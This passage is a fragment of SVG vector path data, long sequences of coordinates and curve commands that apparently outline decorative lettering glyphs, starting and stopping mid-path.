8.088 22.8705 8.088C22.9985 8.088 23.0945 8.008 23.1585 7.848L23.3505 7.992H23.5905C23.6225 7.992 23.6865 7.944 23.7825 7.848V7.752C23.5265 7.592 23.3345 7.512 23.2065 7.512V7.128L23.4465 7.032C23.4785 7.032 23.5105 7.048 23.5425 7.08H23.6385L24.0705 6.936C24.1665 7.128 24.2785 7.288 24.4065 7.416C24.4385 7.416 24.4545 7.384 24.4545 7.32C24.5505 7.352 24.6785 7.448 24.8385 7.608C25.0305 7.736 25.1585 7.8 25.2225 7.8C25.2545 7.8 25.3025 7.784 25.3665 7.752C25.4305 7.688 25.4945 7.64 25.5585 7.608H25.7985C26.0865 7.608 26.4065 7.544 26.7585 7.416L26.9025 7.512C26.9985 7.416 27.1105 7.368 27.2385 7.368C27.3025 7.368 27.3345 7.384 27.3345 7.416H27.3825L27.9105 7.32C27.9745 7.256 28.0865 7.208 28.2465 7.176C28.4065 7.144 28.6785 7.128 29.0625 7.128C29.0945 7.128 29.1105 7.112 29.1105 7.08C29.2385 7.016 29.3665 6.968 29.4945 6.936C29.6545 6.904 29.8305 6.872 30.0225 6.84C30.0545 6.808 30.1185 6.76 30.2145 6.696C30.3425 6.632 30.5505 6.568 30.8385 6.504C30.9025 6.504 30.9665 6.504 31.0305 6.504C31.0945 6.504 31.1905 6.488 31.3185 6.456L31.4625 6.312C31.4945 6.312 31.5105 6.328 31.5105 6.36H31.5585C31.4305 6.36 31.6545 6.232 32.2305 5.976C32.2625 6.008 32.2785 6.056 32.2785 6.12C32.2785 6.184 32.2945 6.264 32.3265 6.36C32.2305 6.36 32.1665 6.424 32.1345 6.552C31.8145 6.584 31.5905 6.712 31.4625 6.936L30.7425 7.224C30.6785 7.224 30.5985 7.224 30.5025 7.224C30.4385 7.224 30.3425 7.24 30.2145 7.272L29.7825 7.512C29.7505 7.512 29.7185 7.496 29.6865 7.464C29.6545 7.432 29.6225 7.416 29.5905 7.416C29.6225 7.416 29.5265 7.464 29.3025 7.56C29.1105 7.656 28.9345 7.704 28.7745 7.704H28.7265C28.7265 7.672 28.7105 7.656 28.6785 7.656L28.5345 7.8C28.4065 7.832 28.2305 7.848 28.0065 7.848C27.8145 7.848 27.5905 7.864 27.3345 7.896C27.3345 7.928 27.3185 7.96 27.2865 7.992C27.3505 7.992 27.3345 8.008 27.2385 8.04C27.1745 8.04 27.0625 8.056 26.9025 8.088C26.8065 8.088 26.6785 8.088 26.5185 8.088C26.3585 8.088 26.1665 8.104 25.9425 8.136C25.9105 8.136 25.8625 8.168 25.7985 8.232L26.4225 8.952V9.096C26.4225 9.096 26.4385 9.112 26.4705 9.144C26.5025 9.176 26.5985 9.32 26.7585 9.576C26.8545 9.768 26.8545 9.88 26.7585 9.912C26.8545 10.232 26.9025 10.344 26.9025 10.248C26.9025 10.28 26.8865 10.36 26.8545 10.488C26.8225 10.616 26.7745 10.792 26.7105 11.016C26.6465 11.112 26.5825 11.24 26.5185 11.4C26.4545 11.528 26.3905 11.688 26.3265 11.88C26.2305 12.008 26.0865 12.184 25.8945 12.408C25.7025 12.6 25.4465 12.856 25.1265 13.176C25.1265 13.208 25.0465 13.272 24.8865 13.368C24.7585 13.432 24.6145 13.576 24.4545 13.8C24.2625 13.896 24.0225 14.008 23.7345 14.136C23.4785 14.232 23.1745 14.36 22.8225 14.52C22.6945 14.552 22.5185 14.6 22.2945 14.664C22.1025 14.696 21.8785 14.728 21.6225 14.76C21.5265 14.792 21.3985 14.84 21.2385 14.904C21.0785 14.968 20.8705 15 20.6145 15C20.0705 15 19.7505 14.984 19.6545 14.952L19.1265 15.048ZM19.5585 14.568C19.5585 14.6 19.5585 14.6 19.5585 14.568C19.5905 14.504 19.6225 14.472 19.6545 14.472L20.0385 14.568C20.2305 14.568 20.3425 14.552 20.3745 14.52C20.4385 14.456 20.5185 14.424 20.6145 14.424H20.8065C20.9025 14.456 20.9825 14.472 21.0465 14.472C21.0785 14.472 21.1265 14.456 21.1905 14.424C21.2545 14.36 21.3025 14.328 21.3345 14.328C21.3985 14.328 21.4305 14.344 21.4305 14.376L21.5745 14.28H22.1985C22.1985 14.28 22.2945 14.264 22.4865 14.232C22.7105 14.168 22.9185 14.072 23.1105 13.944L23.4945 13.704C23.7505 13.544 23.9745 13.432 24.1665 13.368C24.3585 13.272 24.5025 13.192 24.5985 13.128C25.0785 12.776 25.3985 12.392 25.5585 11.976C25.5585 11.88 25.5745 11.768 25.6065 11.64C25.6705 11.48 25.7025 11.384 25.7025 11.352C25.7025 11.224 25.6385 11.096 25.5105 10.968C25.5105 10.904 25.5105 10.808 25.5105 10.68C25.5425 10.552 25.5745 10.408 25.6065 10.248L25.5105 10.152C25.4465 9.896 25.3345 9.64 25.1745 9.384C25.1425 9.384 25.1105 9.368 25.0785 9.336C25.0465 9.304 25.0145 9.16 24.9825 8.904L24.7425 8.712V8.472H24.2145C24.1825 8.472 24.1505 8.456 24.1185 8.424C24.0865 8.392 24.0545 8.376 24.0225 8.376H23.7825C23.4305 8.536 23.2545 8.632 23.2545 8.664H23.3025C23.3025 8.664 23.2865 8.664 23.2545 8.664L22.8705 8.52C22.8705 8.52 22.7905 8.552 22.6305 8.616C22.4705 8.68 22.2945 8.712 22.1025 8.712C22.0705 8.712 22.0385 8.696 22.0065 8.664C21.9745 8.6 21.9265 8.568 21.8625 8.568C21.8305 8.568 21.7665 8.616 21.6705 8.712C21.5745 8.776 21.5105 8.808 21.4785 8.808C21.4145 8.808 21.3665 8.792 21.3345 8.76C21.3345 8.728 21.3185 8.712 21.2865 8.712C21.2545 8.712 21.2065 8.728 21.1425 8.76C21.0785 8.792 21.0305 8.808 20.9985 8.808C20.9985 8.808 20.8865 8.744 20.6625 8.616C20.6625 8.872 20.5665 9 20.3745 9C20.2465 9 20.1825 8.888 20.1825 8.664C20.0545 8.696 19.9425 8.744 19.8465 8.808C19.7825 8.84 19.7025 8.856 19.6065 8.856H19.4625L19.3185 8.712C19.2865 8.808 19.2065 8.856 19.0785 8.856C18.9825 8.856 18.9185 8.84 18.8865 8.808V8.664C18.8545 8.696 18.8065 8.728 18.7425 8.76C18.6785 8.792 18.6145 8.824 18.5505 8.856V8.904C18.5505 9.064 18.4545 9.208 18.2625 9.336C18.0705 9.464 17.7985 9.624 17.4465 9.816C17.4465 9.848 17.4465 9.896 17.4465 9.96C17.4785 9.992 17.4945 10.024 17.4945 10.056C17.4945 10.376 17.3505 10.584 17.0625 10.68L16.6305 11.976C16.6945 11.976 16.7265 11.992 16.7265 12.024L17.2545 13.608C17.2865 13.608 17.3185 13.592 17.3505 13.56H17.4945C17.5905 13.56 17.6705 13.672 17.7345 13.896C17.7985 14.088 17.8945 14.184 18.0225 14.184C18.0545 14.184 18.0705 14.168 18.0705 14.136H18.1185C18.0865 14.136 18.2145 14.2 18.5025 14.328C18.5025 14.328 18.5985 14.36 18.7905 14.424L18.8865 14.328C19.3345 14.424 19.5585 14.504 19.5585 14.568ZM36.4028 15.048C36.4028 15.048 36.2908 14.984 36.0667 14.856C35.9707 14.856 35.8267 14.84 35.6348 14.808C35.4427 14.776 35.1547 14.664 34.7708 14.472C34.7067 14.44 34.6107 14.408 34.4827 14.376C34.3867 14.312 34.2747 14.232 34.1467 14.136C34.1147 13.976 33.9707 13.736 33.7147 13.416H33.6187L33.4747 13.512C33.4427 13.352 33.3467 13.208 33.1867 13.08C33.1867 12.952 33.1227 12.808 32.9947 12.648C33.0587 12.392 33.0587 12.104 32.9947 11.784C32.9307 11.592 32.8027 11.4 32.6107 11.208L32.7547 11.016C32.8187 10.888 32.8827 10.744 32.9467 10.584C33.0107 10.392 33.0747 10.184 33.1387 9.96C33.1707 9.832 33.2027 9.688 33.2347 9.528C33.2667 9.368 33.3147 9.176 33.3787 8.952C33.3467 8.92 33.1867 8.792 32.8987 8.568C32.6427 8.344 32.4187 8.28 32.2267 8.376C32.2587 8.312 32.2747 8.264 32.2747 8.232C32.2747 8.168 32.2747 8.136 32.2747 8.136C32.2747 8.104 32.2427 8.072 32.1787 8.04C32.1147 7.976 32.0827 7.912 32.0827 7.848C32.0827 7.848 32.1307 7.8 32.2267 7.704C32.3227 7.576 32.3867 7.512 32.4187 7.512C32.4827 7.512 32.5787 7.544 32.7067 7.608C32.8667 7.672 32.9787 7.704 33.0427 7.704C33.0747 7.704 33.1227 7.688 33.1867 7.656C33.2507 7.624 33.2987 7.608 33.3307 7.608L34.1467 7.8C34.2107 7.8 34.3067 7.768 34.4347 7.704L35.6348 6.504C35.7307 6.504 35.7787 6.488 35.7787 6.456C35.8108 6.392 35.9868 6.216 36.3067 5.928C36.3388 5.928 36.3867 5.912 36.4507 5.88C36.5468 5.848 36.6748 5.752 36.8347 5.592L36.9787 5.352C37.9068 4.712 38.7228 4.392 39.4268 4.392H39.7628C39.6988 4.456 39.7308 4.488 39.8588 4.488C39.8908 4.488 39.9388 4.472 40.0027 4.44C40.0668 4.408 40.1148 4.392 40.1468 4.392L40.4348 4.584H40.7227C40.8508 4.712 40.9148 4.776 40.9148 4.776C40.9468 4.776 40.9628 4.76 40.9628 4.728H41.0108C40.9468 4.728 41.0108 4.824 41.2028 5.016C41.2028 5.016 41.1228 5.272 40.9628 5.784C40.8668 5.848 40.7228 5.976 40.5308 6.168C40.3708 6.36 40.2588 6.456 40.1948 6.456C40.1628 6.456 40.0828 6.424 39.9547 6.36C39.8588 6.296 39.7788 6.264 39.7148 6.264C39.6827 6.264 39.5868 6.296 39.4268 6.36C39.2668 6.424 39.1548 6.488 39.0908 6.552C39.0588 6.584 38.9788 6.632 38.8508 6.696C38.7548 6.728 38.3868 6.856 37.7468 7.08C37.7787 7.304 37.7307 7.432 37.6028 7.464C37.3788 7.496 37.2348 7.576 37.1707 7.704V7.752C37.3307 7.912 37.6988 7.992 38.2747 7.992C38.3068 7.992 38.3388 7.976 38.3708 7.944C38.4348 7.912 38.4988 7.896 38.5627 7.896C38.5947 7.896 38.6267 7.912 38.6588 7.944H38.7548C38.7868 7.944 38.8348 7.928 38.8987 7.896C38.9627 7.832 39.0108 7.8 39.0428 7.8C39.1068 7.8 39.2988 7.848 39.6187 7.944C39.9388 8.04 40.1148 8.088 40.1468 8.088C40.2747 8.088 40.3707 8.008 40.4348 7.848L40.6268 7.992H40.8668C40.8988 7.992 40.9628 7.944 41.0587 7.848V7.752C40.8027 7.592 40.6107 7.512 40.4828 7.512V7.128L40.7227 7.032C40.7548 7.032 40.7868 7.048 40.8188 7.08H40.9148L41.3468 6.936C41.4428 7.128 41.5548 7.288 41.6828 7.416C41.7148 7.416 41.7308 7.384 41.7308 7.32C41.8268 7.352 41.9548 7.448 42.1148 7.608C42.3068 7.736 42.4348 7.8 42.4987 7.8C42.5308 7.8 42.5788 7.784 42.6428 7.752C42.7068 7.688 42.7708 7.64 42.8348 7.608H43.0748C43.3628 7.608 43.6828 7.544 44.0348 7.416L44.1788 7.512C44.2748 7.416 44.3868 7.368 44.5148 7.368C44.5788 7.368 44.6108 7.384 44.6108 7.416H44.6588L45.1868 7.32C45.2508 7.256 45.3628 7.208 45.5228 7.176C45.6828 7.144 45.9548 7.128 46.3387 7.128C46.3708 7.128 46.3868 7.112 46.3868 7.08C46.5148 7.016 46.6428 6.968 46.7708 6.936C46.9307 6.904 47.1068 6.872 47.2988 6.84C47.3308 6.808 47.3948 6.76 47.4908 6.696C47.6188 6.632 47.8268 6.568 48.1147 6.504C48.1788 6.504 48.2428 6.504 48.3068 6.504C48.3708 6.504 48.4668 6.488 48.5948 6.456L48.7388 6.312C48.7708 6.312 48.7868 6.328 48.7868 6.36H48.8348C48.7068 6.36 48.9308 6.232 49.5068 5.976C49.5388 6.008 49.5547 6.056 49.5547 6.12C49.5547 6.184 49.5708 6.264 49.6028 6.36C49.5068 6.36 49.4428 6.424 49.4108 6.552C49.0908 6.584 48.8668 6.712 48.7388 6.936L48.0188 7.224C47.9548 7.224 47.8748 7.224 47.7787 7.224C47.7148 7.224 47.6188 7.24 47.4908 7.272L47.0588 7.512C47.0268 7.512 46.9948 7.496 46.9628 7.464C46.9308 7.432 46.8988 7.416 46.8668 7.416C46.8988 7.416 46.8028 7.464 46.5788 7.56C46.3868 7.656 46.2108 7.704 46.0508 7.704H46.0027C46.0027 7.672 45.9868 7.656 45.9548 7.656L45.8108 7.8C45.6828 7.832 45.5068 7.848 45.2828 7.848C45.0908 7.848 44.8668 7.864 44.6108 7.896C44.6108 7.928 44.5948 7.96 44.5627 7.992C44.6267 7.992 44.6108 8.008 44.5148 8.04C44.4508 8.04 44.3388 8.056 44.1788 8.088C44.0828 8.088 43.9548 8.088 43.7947 8.088C43.6347 8.088 43.4427 8.104 43.2188 8.136C43.1868 8.136 43.1388 8.168 43.0748 8.232L43.6988 8.952V9.096C43.6988 9.096 43.7148 9.112 43.7468 9.144C43.7787 9.176 43.8748 9.32 44.0348 9.576C44.1308 9.768 44.1308 9.88 44.0348 9.912C44.1308 10.232 44.1788 10.344 44.1788 10.248C44.1788 10.28 44.1628 10.36 44.1307 10.488C44.0988 10.616 44.0508 10.792 43.9868 11.016C43.9227 11.112 43.8587 11.24 43.7947 11.4C43.7308 11.528 43.6668 11.688 43.6028 11.88C43.5068 12.008 43.3628 12.184 43.1708 12.408C42.9788 12.6 42.7228 12.856 42.4028 13.176C42.4028 13.208 42.3228 13.272 42.1628 13.368C42.0348 13.432 41.8908 13.576 41.7308 13.8C41.5388 13.896 41.2988 14.008 41.0108 14.136C40.7548 14.232 40.4508 14.36 40.0988 14.52C39.9708 14.552 39.7948 14.6 39.5708 14.664C39.3788 14.696 39.1547 14.728 38.8987 14.76C38.8028 14.792 38.6748 14.84 38.5147 14.904C38.3547 14.968 38.1467 15 37.8907 15C37.3468 15 37.0268 14.984 36.9308 14.952L36.4028 15.048ZM36.8347 14.568C36.8347 14.6 36.8347 14.6 36.8347 14.568C36.8668 14.504 36.8988 14.472 36.9308 14.472L37.3148 14.568C37.5068 14.568 37.6188 14.552 37.6508 14.52C37.7148 14.456 37.7948 14.424 37.8907 14.424H38.0828C38.1788 14.456 38.2587 14.472 38.3228 14.472C38.3548 14.472 38.4028 14.456 38.4668 14.424C38.5308 14.36 38.5787 14.328 38.6107 14.328C38.6748 14.328 38.7068 14.344 38.7068 14.376L38.8508 14.28H39.4748C39.4748 14.28 39.5708 14.264 39.7628 14.232C39.9868 14.168 40.1948 14.072 40.3867 13.944L40.7708 13.704C41.0268 13.544 41.2508 13.432 41.4427 13.368C41.6348 13.272 41.7788 13.192 41.8748 13.128C42.3548 12.776 42.6748 12.392 42.8348 11.976C42.8348 11.88 42.8508 11.768 42.8828 11.64C42.9468 11.48 42.9788 11.384 42.9788 11.352C42.9788 11.224 42.9148 11.096 42.7868 10.968C42.7868 10.904 42.7868 10.808 42.7868 10.68C42.8188 10.552 42.8508 10.408 42.8828 10.248L42.7868 10.152C42.7228 9.896 42.6108 9.64 42.4508 9.384C42.4188 9.384 42.3868 9.368 42.3548 9.336C42.3228 9.304 42.2908 9.16 42.2588 8.904L42.0188 8.712V8.472H41.4908C41.4588 8.472 41.4268 8.456 41.3948 8.424C41.3628 8.392 41.3308 8.376 41.2988 8.376H41.0587C40.7068 8.536 40.5308 8.632 40.5308 8.664H40.5788C40.5788 8.664 40.5628 8.664 40.5308 8.664L40.1468 8.52C40.1468 8.52 40.0668 8.552 39.9068 8.616C39.7468 8.68 39.5707 8.712 39.3788 8.712C39.3468 8.712 39.3147 8.696 39.2827 8.664C39.2507 8.6 39.2027 8.568 39.1388 8.568C39.1068 8.568 39.0428 8.616 38.9467 8.712C38.8508 8.776 38.7868 8.808 38.7548 8.808C38.6908 8.808 38.6428 8.792 38.6107 8.76C38.6107 8.728 38.5947 8.712 38.5627 8.712C38.5307 8.712 38.4827 8.728 38.4188 8.76C38.3548 8.792 38.3068 8.808 38.2747 8.808C38.2747 8.808 38.1628 8.744 37.9388 8.616C37.9388 8.872 37.8428 9 37.6508 9C37.5227 9 37.4587 8.888 37.4587 8.664C37.3307 8.696 37.2188 8.744 37.1228 8.808C37.0588 8.84 36.9787 8.856 36.8828 8.856H36.7388L36.5948 8.712C36.5628 8.808 36.4828 8.856 36.3548 8.856C36.2588 8.856 36.1948 8.84 36.1628 8.808V8.664C36.1307 8.696 36.0827 8.728 36.0188 8.76C35.9547 8.792 35.8907 8.824 35.8268 8.856V8.904C35.8268 9.064 35.7307 9.208 35.5387 9.336C35.3467 9.464 35.0747 9.624 34.7227 9.816C34.7227 9.848 34.7227 9.896 34.7227 9.96C34.7548 9.992 34.7708 10.024 34.7708 10.056C34.7708 10.376 34.6267 10.584 34.3387 10.68L33.9067 11.976C33.9707 11.976 34.0027 11.992 34.0027 12.024L34.5307 13.608C34.5627 13.608 34.5947 13.592 34.6267 13.56H34.7708C34.8668 13.56 34.9467 13.672 35.0107 13.896C35.0747 14.088 35.1708 14.184 35.2988 14.184C35.3307 14.184 35.3467 14.168 35.3467 14.136H35.3947C35.3627 14.136 35.4907 14.2 35.7787 14.328C35.7787 14.328 35.8747 14.36 36.0667 14.424L36.1628 14.328C36.6107 14.424 36.8347 14.504 36.8347 14.568ZM49.263 15.576C49.231 15.544 49.215 15.496 49.215 15.432C49.215 15.304 49.263 15.176 49.359 15.048C49.455 14.92 49.503 14.856 49.503 14.856L49.551 13.992C49.615 13.896 49.743 13.768 49.935 13.608C49.935 13.512 49.967 13.368 50.031 13.176C49.999 13.208 49.983 13.064 49.983 12.744C50.047 12.68 50.095 12.616 50.127 12.552C50.095 12.52 50.079 12.232 50.079 11.688C50.079 11.72 50.127 11.64 50.223 11.448C50.191 11.32 50.191 11.16 50.223 10.968C50.287 10.84 50.335 10.712 50.367 10.584C50.399 10.424 50.399 10.28 50.367 10.152L50.271 9.096C50.239 8.648 50.239 8.408 50.271 8.376C50.207 8.216 50.223 8.072 50.319 7.944C50.223 7.4 49.871 6.92 49.263 6.504V6.264C49.295 6.264 49.343 6.248 49.407 6.216C49.471 6.184 49.519 6.168 49.551 6.168C49.583 6.168 49.647 6.2 49.743 6.264C49.871 6.328 49.951 6.36 49.983 6.36H50.607C50.575 6.392 50.671 6.568 50.895 6.888C51.151 7.176 51.327 7.496 51.423 7.848C51.423 7.944 51.439 8.056 51.471 8.184C51.535 8.312 51.615 8.392 51.711 8.424C51.807 8.712 51.855 9.016 51.855 9.336C51.855 9.464 51.839 9.608 51.807 9.768C51.807 9.896 51.791 10.04 51.759 10.2L51.903 10.344C51.999 10.568 52.047 10.808 52.047 11.064L52.191 11.112L53.199 9.624C53.199 9.592 53.295 9.512 53.487 9.384C53.551 9.256 53.647 9.128 53.775 9C53.935 9 54.015 8.952 54.015 8.856C54.015 8.728 54.175 8.536 54.495 8.28C54.591 7.832 54.847 7.592 55.263 7.56V7.512C55.263 7.32 55.343 7.224 55.503 7.224C55.663 7.192 55.759 7.064 55.791 6.84L56.223 6.552C56.255 6.488 56.287 6.424 56.319 6.36C56.351 6.296 56.399 6.216 56.463 6.12C56.495 6.088 56.623 6.04 56.847 5.976C57.423 5.592 57.711 5.384 57.711 5.352C57.743 5.32 57.807 5.272 57.903 5.208C57.967 5.176 58.031 5.144 58.095 5.112C58.159 5.08 58.239 5.048 58.335 5.016C58.335 5.016 58.367 4.968 58.431 4.872C58.495 4.744 58.559 4.68 58.623 4.68C58.655 4.68 58.671 4.696 58.671 4.728H58.719C58.655 4.728 58.831 4.616 59.247 4.392C59.343 4.328 59.439 4.28 59.535 4.248C59.663 4.216 59.791 4.184 59.919 4.152C60.111 3.832 60.383 3.672 60.735 3.672C60.767 3.672 60.783 3.688 60.783 3.72C60.815 3.752 60.863 3.768 60.927 3.768C60.959 3.768 60.991 3.752 61.023 3.72C61.087 3.688 61.135 3.672 61.167 3.672C61.487 3.672 61.727 3.848 61.887 4.2C62.143 4.776 62.271 5.384 62.271 6.024V7.272C62.271 7.304 62.303 7.352 62.367 7.416C62.367 7.48 62.351 7.544 62.319 7.608L62.559 9.24L62.847 10.728C62.911 10.856 62.991 11 63.087 11.16C63.183 11.288 63.263 11.448 63.327 11.64L63.471 11.736C63.631 11.8 63.711 11.96 63.711 12.216L64.287 12.456C64.447 12.616 64.511 12.68 64.479 12.648L65.055 12.36C65.119 12.392 65.167 12.424 65.199 12.456C65.231 12.456 65.247 12.456 65.247 12.456C65.311 12.456 65.439 12.344 65.631 12.12C65.855 11.896 65.983 11.736 66.015 11.64C66.079 11.64 66.127 11.656 66.159 11.688C66.191 11.752 66.207 11.8 66.207 11.832C66.239 11.864 66.255 11.88 66.255 11.88C66.255 11.976 65.935 12.344 65.295 12.984C65.263 12.984 65.231 13.016 65.199 13.08C65.167 13.112 65.135 13.128 65.103 13.128C65.039 13.128 65.023 13.112 65.055 13.08H65.007C64.943 13.08 64.879 13.176 64.815 13.368L64.191 13.8V13.992C63.839 14.12 63.583 14.216 63.423 14.28C63.263 14.344 63.199 14.376 63.231 14.376C63.103 14.376 63.023 14.344 62.991 14.28C62.959 14.216 62.927 14.184 62.895 14.184H62.847C62.847 14.216 62.831 14.232 62.799 14.232C62.607 14.232 62.479 14.136 62.415 13.944L62.367 13.992C62.239 13.992 62.079 13.88 61.887 13.656C61.695 13.4 61.567 13.24 61.503 13.176L61.599 13.08C61.599 13.016 61.535 12.968 61.407 12.936C61.311 12.552 61.231 12.392 61.167 12.456C61.103 12.52 61.055 12.344 61.023 11.928C61.055 11.864 61.071 11.784 61.071 11.688C61.071 11.56 61.087 11.432 61.119 11.304C60.959 11.016 60.783 10.92 60.591 11.016C60.591 10.952 60.559 10.824 60.495 10.632C60.527 10.568 60.543 10.536 60.543 10.536C60.543 10.504 60.543 10.488 60.543 10.488C60.447 10.328 60.431 10.12 60.495 9.864L60.591 9.432L60.447 9.24V8.808C60.319 8.744 60.223 8.68 60.159 8.616C60.095 8.52 60.031 8.456 59.967 8.424V7.608C60.031 7.448 60.079 7.352 60.111 7.32L59.871 6.984V6.888C59.871 6.792 59.839 6.68 59.775 6.552C59.711 6.392 59.631 6.2 59.535 5.976C59.343 5.784 59.151 5.688 58.959 5.688C58.927 5.688 58.895 5.704 58.863 5.736C58.863 5.768 58.831 5.784 58.767 5.784C58.831 5.784 58.783 5.752 58.623 5.688C58.559 5.752 58.527 5.816 58.527 5.88C58.303 5.88 58.143 5.928 58.047 6.024C57.951 6.12 57.903 6.168 57.903 6.168C57.871 6.168 57.855 6.152 57.855 6.12C57.887 6.088 57.887 6.072 57.855 6.072C57.855 6.072 57.631 6.264 57.183 6.648C57.119 6.648 57.071 6.664 57.039 6.696C56.879 6.792 56.799 6.888 56.799 6.984C56.383 7.112 55.903 7.544 55.359 8.28C55.327 8.28 55.247 8.312 55.119 8.376C54.895 8.632 54.607 8.952 54.255 9.336C53.903 9.688 53.503 10.104 53.055 10.584C52.959 10.68 52.879 10.776 52.815 10.872C52.751 10.968 52.575 11.208 52.287 11.592C52.255 11.624 52.207 11.672 52.143 11.736C52.079 11.8 52.015 11.864 51.951 11.928C51.951 12.024 51.887 12.184 51.759 12.408C51.663 12.6 51.615 12.872 51.615 13.224C51.615 13.288 51.535 13.432 51.375 13.656C51.215 13.88 51.135 14.056 51.135 14.184C51.135 14.248 51.151 14.296 51.183 14.328C51.087 14.36 50.943 14.424 50.751 14.52C50.591 14.616 50.495 14.664 50.463 14.664C50.431 14.664 50.399 14.648 50.367 14.616C50.367 14.584 50.351 14.568 50.319 14.568C50.255 14.568 50.159 14.632 50.031 14.76V14.856C50.031 14.952 49.983 15.096 49.887 15.288C49.663 15.288 49.551 15.384 49.551 15.576C49.423 15.608 49.327 15.608 49.263 15.576ZM74.424 15.048C74.424 15.048 74.312 14.984 74.088 14.856C73.992 14.856 73.848 14.84 73.656 14.808C73.464 14.776 73.176 14.664 72.792 14.472C72.728 14.44 72.632 14.408 72.504 14.376C72.408 14.312 72.296 14.232 72.168 14.136C72.136 13.976 71.992 13.736 71.736 13.416H71.64L71.496 13.512C71.464 13.352 71.368 13.208 71.208 13.08C71.208 12.952 71.144 12.808 71.016 12.648C71.08 12.392 71.08 12.104 71.016 11.784C70.952 11.592 70.824 11.4 70.632 11.208L70.776 11.016C70.84 10.888 70.904 10.744 70.968 10.584C71.032 10.392 71.096 10.184 71.16 9.96C71.192 9.832 71.224 9.688 71.256 9.528C71.288 9.368 71.336 9.176 71.4 8.952C71.368 8.92 71.208 8.792 70.92 8.568C70.664 8.344 70.44 8.28 70.248 8.376C70.28 8.312 70.296 8.264 70.296 8.232C70.296 8.168 70.296 8.136 70.296 8.136C70.296 8.104 70.264 8.072 70.2 8.04C70.136 7.976 70.104 7.912 70.104 7.848C70.104 7.848 70.152 7.8 70.248 7.704C70.344 7.576 70.408 7.512 70.44 7.512C70.504 7.512 70.6 7.544 70.728 7.608C70.888 7.672 71 7.704 71.064 7.704C71.096 7.704 71.144 7.688 71.208 7.656C71.272 7.624 71.32 7.608 71.352 7.608L72.168 7.8C72.232 7.8 72.328 7.768 72.456 7.704L73.656 6.504C73.752 6.504 73.8 6.488 73.8 6.456C73.832 6.392 74.008 6.216 74.328 5.928C74.36 5.928 74.408 5.912 74.472 5.88C74.568 5.848 74.696 5.752 74.856 5.592L75 5.352C75.928 4.712 76.744 4.392 77.448 4.392H77.784C77.72 4.456 77.752 4.488 77.88 4.488C77.912 4.488 77.96 4.472 78.024 4.44C78.088 4.408 78.136 4.392 78.168 4.392L78.456 4.584H78.744C78.872 4.712 78.936 4.776 78.936 4.776C78.968 4.776 78.984 4.76 78.984 4.728H79.032C78.968 4.728 79.032 4.824 79.224 5.016C79.224 5.016 79.144 5.272 78.984 5.784C78.888 5.848 78.744 5.976 78.552 6.168C78.392 6.36 78.28 6.456 78.216 6.456C78.184 6.456 78.104 6.424 77.976 6.36C77.88 6.296 77.8 6.264 77.736 6.264C77.704 6.264 77.608 6.296 77.448 6.36C77.288 6.424 77.176 6.488 77.112 6.552C77.08 6.584 77 6.632 76.872 6.696C76.776 6.728 76.408 6.856 75.768 7.08C75.8 7.304 75.752 7.432 75.624 7.464C75.4 7.496 75.256 7.576 75.192 7.704V7.752C75.352 7.912 75.72 7.992 76.296 7.992C76.328 7.992 76.36 7.976 76.392 7.944C76.456 7.912 76.52 7.896 76.584 7.896C76.616 7.896 76.648 7.912 76.68 7.944H76.776C76.808 7.944 76.856 7.928 76.92 7.896C76.984 7.832 77.032 7.8 77.064 7.8C77.128 7.8 77.32 7.848 77.64 7.944C77.96 8.04 78.136 8.088 78.168 8.088C78.296 8.088 78.392 8.008 78.456 7.848L78.648 7.992H78.888C78.92 7.992 78.984 7.944 79.08 7.848V7.752C78.824 7.592 78.632 7.512 78.504 7.512V7.128L78.744 7.032C78.776 7.032 78.808 7.048 78.84 7.08H78.936L79.368 6.936C79.464 7.128 79.576 7.288 79.704 7.416C79.736 7.416 79.752 7.384 79.752 7.32C79.848 7.352 79.976 7.448 80.136 7.608C80.328 7.736 80.456 7.8 80.52 7.8C80.552 7.8 80.6 7.784 80.664 7.752C80.728 7.688 80.792 7.64 80.856 7.608H81.096C81.384 7.608 81.704 7.544 82.056 7.416L82.2 7.512C82.296 7.416 82.408 7.368 82.536 7.368C82.6 7.368 82.632 7.384 82.632 7.416H82.68L83.208 7.32C83.272 7.256 83.384 7.208 83.544 7.176C83.704 7.144 83.976 7.128 84.36 7.128C84.392 7.128 84.408 7.112 84.408 7.08C84.536 7.016 84.664 6.968 84.792 6.936C84.952 6.904 85.128 6.872 85.32 6.84C85.352 6.808 85.416 6.76 85.512 6.696C85.64 6.632 85.848 6.568 86.136 6.504C86.2 6.504 86.264 6.504 86.328 6.504C86.392 6.504 86.488 6.488 86.616 6.456L86.76 6.312C86.792 6.312 86.808 6.328 86.808 6.36H86.856C86.728 6.36 86.952 6.232 87.528 5.976C87.56 6.008 87.576 6.056 87.576 6.12C87.576 6.184 87.592 6.264 87.624 6.36C87.528 6.36 87.464 6.424 87.432 6.552C87.112 6.584 86.888 6.712 86.76 6.936L86.04 7.224C85.976 7.224 85.896 7.224 85.8 7.224C85.736 7.224 85.64 7.24 85.512 7.272L85.08 7.512C85.048 7.512 85.016 7.496 84.984 7.464C84.952 7.432 84.92 7.416 84.888 7.416C84.92 7.416 84.824 7.464 84.6 7.56C84.408 7.656 84.232 7.704 84.072 7.704H84.024C84.024 7.672 84.008 7.656 83.976 7.656L83.832 7.8C83.704 7.832 83.528 7.848 83.304 7.848C83.112 7.848 82.888 7.864 82.632 7.896C82.632 7.928 82.616 7.96 82.584 7.992C82.648 7.992 82.632 8.008 82.536 8.04C82.472 8.04 82.36 8.056 82.2 8.088C82.104 8.088 81.976 8.088 81.816 8.088C81.656 8.088 81.464 8.104 81.24 8.136C81.208 8.136 81.16 8.168 81.096 8.232L81.72 8.952V9.096C81.72 9.096 81.736 9.112 81.768 9.144C81.8 9.176 81.896 9.32 82.056 9.576C82.152 9.768 82.152 9.88 82.056 9.912C82.152 10.232 82.2 10.344 82.2 10.248C82.2 10.28 82.184 10.36 82.152 10.488C82.12 10.616 82.072 10.792 82.008 11.016C81.944 11.112 81.88 11.24 81.816 11.4C81.752 11.528 81.688 11.688 81.624 11.88C81.528 12.008 81.384 12.184 81.192 12.408C81 12.6 80.744 12.856 80.424 13.176C80.424 13.208 80.344 13.272 80.184 13.368C80.056 13.432 79.912 13.576 79.752 13.8C79.56 13.896 79.32 14.008 79.032 14.136C78.776 14.232 78.472 14.36 78.12 14.52C77.992 14.552 77.816 14.6 77.592 14.664C77.4 14.696 77.176 14.728 76.92 14.76C76.824 14.792 76.696 14.84 76.536 14.904C76.376 14.968 76.168 15 75.912 15C75.368 15 75.048 14.984 74.952 14.952L74.424 15.048ZM74.856 14.568C74.856 14.6 74.856 14.6 74.856 14.568C74.888 14.504 74.92 14.472 74.952 